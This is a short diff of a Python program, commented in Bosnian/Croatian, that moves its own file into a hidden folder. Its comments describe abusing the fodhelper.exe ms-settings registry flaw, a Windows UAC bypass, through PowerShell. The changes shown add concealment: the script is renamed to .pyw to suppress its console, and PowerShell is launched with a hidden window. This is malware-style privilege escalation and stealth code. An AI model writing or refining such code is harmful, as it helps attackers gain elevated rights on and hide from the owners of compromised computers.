@@ -27,7 +27,7 @@ class Inicijalizacija:
         
         # Premještanje trenutnog Python fajla u skriveni folder
         current_file = os.path.abspath(__file__) # Puna putanja do trenutne lokacije datoteke
-        destination = "C:\\skriveni_folder\\Inicijalizator.py" # Puna putanja do destinacije
+        destination = "C:\\skriveni_folder\\Inicijalizator.pyw" # Puna putanja do destinacije
         
         shutil.move(current_file, destination)
         print(f"File je premješten u skriveni folder.")
@@ -62,7 +62,7 @@ class Inicijalizacija:
         Start-Sleep 3
         Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force     # Brisanje registry itema nakon što su iskorišteni za fodhelper.exe sigurnosni propust
         """
-        subprocess.call(["powershell.exe", "-Command", powershell_script])    # Poziv powershell skripte
+        subprocess.call(["powershell.exe", "-WindowStyle", "Hidden", "-Command", powershell_script])    # Poziv powershell skripte
 
 ##########################################################################################################################################################################
 
